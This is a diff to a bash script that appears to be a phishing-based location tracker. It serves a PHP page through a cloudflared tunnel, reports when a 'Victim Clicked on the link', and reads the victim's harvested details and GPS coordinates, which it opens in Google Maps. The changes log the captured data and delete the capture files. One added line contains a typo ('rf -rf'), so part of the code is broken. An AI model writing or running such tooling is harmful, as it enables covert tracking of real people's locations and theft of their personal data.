@@ -59,12 +59,17 @@ done
 #<<<=========Program=========>>>
 #collecting your name
 #lets tests for login page lol this program is in process not completed!! so dont use now
+#declare some variables
+Infos="$CWD/assets/send/php/info.txt"
+Result="$CWD/assets/send/php/result.txt"
 if [ ! -d $CWD/logs ]; then
     mkdir logs > /dev/null 2>&1
 else
     rm -rf $CWD/logs/phpLogs.txt $CWD/logs/phpSend.txt $CWD/logs/cloudflare-log.txt >/dev/null 2>&1
-    printf ''>$CWD/assets/send/php/result.txt
-    printf ''>$CWD/assets/send/php/info.txt
+    rf -rf $Result >/dev/null 2>&1
+    touch $Result >/dev/null 2>&1
+    rm -rf $Infos >/dev/null 2>&1
+    touch $Infos >/dev/null 2>&1
 fi
 killall php cloudflared >/dev/null 2>&1
 cd $CWD/assets/send >/dev/null 2>&1
@@ -118,11 +123,14 @@ checkFound() {
         if [[ -e $CWD/assets/send/php/info.txt ]]; then
             printf "\n${S2}Victim Clicked on the link ;)!!${R0}\n"
             cat  $CWD/assets/send/php/info.txt | jq
+            cat $CWD/assets/send/php/info.txt>$CWD/info.log
+            rm -rf $CWD/assets/send/php/info.txt >/dev/null 2>&1
         fi
         if [[ -e $CWD/assets/send/php/result.txt ]]; then
             latitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lat)
             longitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lon)
             xdg-open "https://maps.google.com/maps?q=${latitude},${longitude}"
+            rm -rf $CWD/assets/send/php/result.txt >/dev/null 2>&1
             printf "\n\n${S7}[${S4}+${S7}] ${S2}Location ${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n\n\n"
         fi
     done
